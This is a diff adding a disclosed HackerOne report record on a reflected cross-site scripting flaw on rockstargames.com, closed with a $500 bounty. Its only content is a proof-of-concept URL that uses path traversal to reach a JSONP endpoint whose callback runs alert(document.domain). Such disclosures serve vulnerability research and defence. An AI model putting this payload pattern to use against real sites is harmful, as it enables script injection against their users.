@@ -1,0 +1,19 @@
+ReportLink:https://hackerone.com/reports/153618
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/nahamsec
+ReportedTo:Rockstar Games(rockstargames)
+BountyAmount:500.0
+Severity:medium
+State:Closed
+DateOfDisclosure:16.03.2017 22:23:53
+
+Summary:
+
+Hello,
+
+Here's the link:
+
+http://www.rockstargames.com/newswire/tags#/?tags=../../comments_dal/users/getGlobalLoginSettings.json?callback=alert%28document.domain%29//
+
+Thanks,
+Ben
